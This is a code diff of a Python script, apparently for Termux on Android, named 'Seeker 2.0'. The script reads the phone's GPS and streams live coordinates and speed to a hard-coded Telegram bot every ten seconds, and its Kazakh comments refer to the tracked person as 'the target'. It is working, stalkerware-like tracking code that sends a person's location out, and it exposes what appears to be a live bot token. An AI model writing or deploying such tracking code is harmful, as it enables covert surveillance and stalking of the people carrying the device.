@@ -1,28 +1,58 @@
-import requests
-import time
+import telebot
 import subprocess
 import json
+import time
 
+# Сенің мәліметтерің
 TOKEN = "8711913443:AAFizqWhgtm9w58i2UD5PnckYiXWkKA1s2M"
 CHAT_ID = "7594678193"
+bot = telebot.TeleBot(TOKEN)
 
-def get_location():
+print("Seeker 2.0 LIVE + SPEED іске қосылды...")
+
+def get_live_data():
     try:
-        # GPS-ті оқу
-        loc_data = subprocess.check_output(['termux-location']).decode('utf-8')
-        loc_json = json.loads(loc_data)
-        return loc_json['latitude'], loc_json['longitude']
-    except:
-        return None, None
+        # GPS-тен жылдамдық пен координатты алу
+        raw_data = subprocess.check_output(['termux-location'], timeout=20).decode('utf-8')
+        data = json.loads(raw_data)
+        return {
+            "lat": data['latitude'],
+            "lon": data['longitude'],
+            "speed": round(data.get('speed', 0) * 3.6, 1) # км/сағ
+        }
+    except Exception as e:
+        print(f"GPS қатесі: {e}")
+        return None
 
-def send_to_pro():
-    lat, lon = get_location()
-    if lat and lon:
-        url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
-        payload = {"chat_id": CHAT_ID, "latitude": lat, "longitude": lon}
-        requests.post(url, json=payload)
+# Бастапқы нүктені жіберу (1 сағаттық LIVE режим)
+start_data = get_live_data()
+if start_data:
+    live_msg = bot.send_location(
+        CHAT_ID, 
+        start_data['lat'], 
+        start_data['lon'], 
+        live_period=3600
+    )
+    bot.send_message(CHAT_ID, f"🏁 Бақылау басталды!\nЖылдамдық: {start_data['speed']} км/сағ")
 
-while True:
-    send_to_pro()
-    time.sleep(300) # 5 минут сайын жіберу
-
+    while True:
+        time.sleep(10) # 10 секунд сайын жаңарту
+        new_data = get_live_data()
+        
+        if new_data:
+            try:
+                # Картадағы маркерді жылжыту
+                bot.edit_message_live_location(
+                    chat_id=CHAT_ID,
+                    message_id=live_msg.message_id,
+                    latitude=new_data['lat'],
+                    longitude=new_data['lon']
+                )
+                
+                # Жылдамдық 5 км/сағ-тан асса, хабарлама жіберу (немесе жай ғана лог)
+                if new_data['speed'] > 5:
+                    print(f"Нысана қозғалуда: {new_data['speed']} км/сағ")
+            except Exception as e:
+                pass
+else:
+    print("Қате: Бастапқы координат алынбады. GPS қосулы ма?")
